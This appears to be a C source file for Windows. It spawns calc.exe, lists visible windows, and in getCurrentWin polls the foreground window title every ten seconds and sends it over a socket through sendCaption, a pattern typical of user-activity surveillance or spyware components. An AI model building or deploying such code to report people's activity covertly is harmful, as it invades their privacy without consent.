#define _WINSOCKAPI_ //stop windows.h from including winsock.h
#include <stdio.h>
#include <windows.h>
#include "Messanger.h"

#define MAX_WINTITLE 400
/*function prototypes*/
void getProcessInfo(void);
void createProcess(void);

void createMyProcess() {
	STARTUPINFO structSI;
	PROCESS_INFORMATION structPI;
	BOOL bRetVal;

	structSI.cb = sizeof(STARTUPINFO);

	//get startup information for current process
	GetStartupInfo(&structSI);

	//create a child process
	bRetVal = CreateProcess(
		0, //executable module name
		"calc.exe", //command line
		0, //process security attributes
		0, //thread securitu attributes
		FALSE, //inheritance flags
		CREATE_NEW_CONSOLE, //creation flags
		NULL, //pointer to environment block
		NULL, //current directory
		&structSI, //pointer to startup info struct
		&structPI //pointer to process info struct
		);

	if (bRetVal == FALSE) {
		printf("Error creating new process\n");
		exit(EXIT_FAILURE);

	}
	else {
		printf("\nChild Process from parent %s created!",structSI.lpTitle);
	}
	//close handles to new process
	CloseHandle(structPI.hProcess);
	CloseHandle(structPI.hThread);
}

/*Gets the STARTUPINFO details of the process for the currently executing process i.e from this application.exe*/
void getProcessInfo() {
	STARTUPINFO structSI;
	GetStartupInfo(&structSI);
	printf("\nDesktop: %s", structSI.lpDesktop);
	printf("\nConsole Title: %s", structSI.lpTitle);
	
}

/*Enumerate all open windows*/
BOOL CALLBACK TestEnumWindowsProc(HWND hwnd, LPARAM lParam) {
	char title[256];
	char className[256];
	WINDOWPLACEMENT pWindowPlacement;
	//LPMENUINFO lpMenuInfo;
	//LONG style = GetWindowLong(hwnd,GWL_STYLE);
	GetWindowText(hwnd, title, sizeof(title));
	pWindowPlacement.length = sizeof(WINDOWPLACEMENT);
	BOOL done = GetWindowPlacement(hwnd, &pWindowPlacement);
	if (IsWindowVisible(hwnd) && (title[0]!='\0')) {
	GetClassName(hwnd, className, sizeof(className));
	/*GetMenuInfo(GetMenu(hwnd),lpMenuInfo);
	printf("MenuInfo:%d",lpMenuInfo->dwMenuData);*/
	printf("\nTitle: %s", title);
	printf("\nWin class: %s\n", className);
	}
	return TRUE;
}

/*Get the foreground window text*/
DWORD WINAPI getCurrentWin(SOCKET socket) {

	while (TRUE) {

	Sleep(10000);
	HWND foreGrndWin = GetForegroundWindow();
	if (foreGrndWin) {
		char winTitle[MAX_WINTITLE];
		GetWindowText(foreGrndWin, winTitle, MAX_WINTITLE);
		printf("\nCurrent Window Title  is: %s", winTitle);

		sendCaption(winTitle, socket);
	}
	}
}



